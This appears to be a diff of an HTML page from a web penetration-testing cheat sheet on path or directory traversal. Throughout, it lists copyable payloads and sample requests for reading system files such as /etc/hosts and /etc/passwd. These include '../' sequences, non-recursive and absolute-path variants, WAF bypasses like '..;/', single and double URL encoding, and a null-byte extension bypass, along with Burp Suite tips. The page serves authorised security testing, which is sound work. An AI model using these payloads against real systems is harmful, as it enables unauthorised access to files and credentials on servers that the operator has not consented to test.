@@ -33,10 +33,11 @@
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
 <details>
 <summary>GENERAL COMMANDS</summary>
-<p><b>DESCRIPTION: </b> Collection of commands to use when testing for path/directory traversal.
+<b>DESCRIPTION: </b> Collection of commands to use when testing for path/directory traversal.
 
 <b>C1: </b><mark id="DT01">../../../../etc/hosts</mark>
-<b>C2: </b><mark id="DT02">..././.././..././..././..././..././..././..././etc/hosts</mark>
+<b>C2: 3-1 METHOD </b><mark id="DT02">..././..././..././..././..././..././..././..././etc/hosts</mark> | non-recursively
+<b>C3: </b><mark id="DT03">/etc/hosts</mark> | absolute path bypass
 	
 <b>Try: </b><br>
 * <u>Nullbyte</u> | %00
@@ -44,17 +45,76 @@
 * <u>Double Encoding</u> 
 * <u>UTF-8 Encoding</u>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT02')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT03')">.C3.</button>
 
 <b><u>WAF bypass</u></b>
 
-<b>C3: </b><mark id="DT03">..././etc/hosts</mark>
-<b>C4: </b><mark id="DT04">..;/etc/hosts</mark>
+<b>C4: </b><mark id="DT04">..././etc/hosts</mark>
+<b>C5: </b><mark id="DT05">..;/etc/hosts</mark>
 	
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT03')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT04')">.C3.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT04')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT05')">.C5.</button>
 </details>
-<b>NOTE: </b> All can be tested with 1, 2, or any segments [../] as needed all applications will behave different. If needed, 
+<details>
+<summary>URL-DECODING</summary>
+
+<b>NOTE:</b> It is important to encode one, two, three times, it will be slow but it is important to test if exist any encoding that can be used to bypass
+the control. [burpsuite > crtl + u (encode) | ctrl + shift + u (decode)]
+
+<b>SAMPLES:</b>
+
+<u> > encoded 1 time</u>
+<b>C1: </b><mark id="URL01">..%2f..%2f..%2fetc/hosts</mark>
+	
+<u> > encoded 2 times</u>
+<b>C2: </b><mark id="URL02">..%252f..%252f..%252fetc/hosts</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#URL01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#URL02')">.C2.</button>
+
+	
+</details>
+<details>
+<summary>VALIDATIONS</summary>
+
+<b> > SPECIFIC PATHS</b>
+
+<b>SAMPLE:</b> 
+
+<b>GET /image?filename=/var/www/img/24.jpg HTTP/2
+Host: machetevault.github.io
+Cookie: session=j5QWoOCqRn5B2jGgronDtpWr6Vz055yb</b>
+
+<b>NOTE:</b> Sometimes exist some kind of validations as countermeasure to avoid path traversal. Maybe it is expecting same path and is only
+validating that, so, attempts can be executed. [absolute, encoded, non-recursive, etc.]
+
+<b>SAMPLE:</b> GET /image?filename=/var/www/images/../../../etc/passwd 
+	
+<b>C1: </b><mark id="VAL01">../../../../etc/hosts</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VAL01')">.C1.</button>
+
+<b> > FILE EXTENSION</b>
+
+<b>NOTE:</b> 
+	
+1. If it is validating the extension, it will be needed to intercept the <u>request</u> > <u>send request to repeater</u> and change the extension.
+2. Check headers to see if there's some place providing what it is accepting.
+
+<b>NULL VALIDATION</b>
+
+You can use the value <b><mark id="NU01">%00</mark></b> to test for null validation. Sometimes you can find that vulnerability when the application is retrieving images,
+files and more. 
+
+<b>SAMPLE:</b> GET /image?filename=../../../etc/hosts%00.png HTTP/2
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#NU01')">.C1.</button>
+</details>	
+	
+<b>NOTE: </b> 
+	
+1. All can be tested with 1, 2, or any segments [../] as needed all applications will behave different. If needed, 
 SNIPER ATTACK! (or similar). Also, invert the symbol, use backslash and try it. ["..\"]
+
+2. It is good to enable all columns in burpsuite to see the entire picture. [MIME Type Filters]
 
 CHECK THE FOLLOWING LINK, >>> <a href="https://securityheaders.com" target="_blank">FILE SYSTEM</a> It can be used to check valuable files per OS.
 </div>
